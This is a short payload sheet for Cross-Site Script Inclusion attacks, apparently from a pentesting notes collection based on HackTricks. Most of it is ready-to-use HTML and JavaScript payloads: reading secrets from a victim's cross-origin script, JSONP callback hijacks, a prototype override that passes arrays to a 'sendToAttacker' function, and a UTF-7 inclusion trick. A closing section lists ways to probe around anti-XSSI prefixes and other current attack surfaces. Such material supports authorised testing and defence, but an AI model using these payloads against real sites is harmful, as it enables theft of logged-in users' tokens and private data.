---
title: "Payloads: XSSI"
type: payloads
tags: [payloads, xssi, jsonp, information-disclosure, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-11-11
---

# Payloads: XSSI

Cross-Site Script Inclusion leak primitives (JSONP callback hijack + non-script leak). See [[techniques/web/xssi]].

## Regular XSSI (secret in a global var of a cross-origin script)
```html
<script src="https://victim.tld/script.js"></script>
<script>alert(JSON.stringify(confidential_keys[0]))</script>
```

## JSONP callback hijack (define the callback before including)
```html
<script>function leak(x){alert(JSON.stringify(x))}</script>
<script src="https://victim.tld/p?jsonp=leak"></script>
<!-- nested callback object -->
<script>var angular=function(){};angular.callbacks={};
angular.callbacks._7=function(x){alert(JSON.stringify(x))}</script>
<script src="https://victim.tld/p?jsonp=angular.callbacks._7"></script>
```

## Prototype tampering to leak non-global vars
```javascript
Array.prototype.slice = function(){ sendToAttacker(this) }  // leaks the sliced array
```

## Non-script XSSI (UTF-7-encoded JSON escaping to script)
```html
<script src="http://victim.tld/data.json" charset="UTF-7"></script>
```

Detect dynamic-JS XSSI: diff endpoint response with vs without cookies (Burp DetectDynamicJS).

Source: HackTricks (pentesting-web)

## NEW 2025-2026

1. **Honest viability check**: classic JSON-array hijacking is dead in modern browsers;
   the live 2025-26 shapes are (a) authenticated JS endpoints - config.js/bundle
   fragments embedding tokens, (b) responses with JS-executable shapes behind
   callbacks the endpoint itself reflects.
2. **Prefix-protection bypass probing**: `])}while(1)</script>` and `while(1);`
   anti-XSSI prefixes - test double-include (two script tags sharing a throwaway
   wrapper), older-parser edge cases, and endpoint variants that omit the prefix
   (Accept header variation, HEAD vs GET, error paths).
3. **GraphQL/persisted responses as inclusion surface**: persisted-query IDs returning
   JSON without prefix + any reflected wrapper param = includable authenticated data.
4. **nosniff gap test**: `X-Content-Type-Options: nosniff` absent on a JSON endpoint
   serving executable-ish content keeps script-inclusion viable in older embedded
   webviews (kiosk/printer/IoT UIs - still common 2026 fleets).
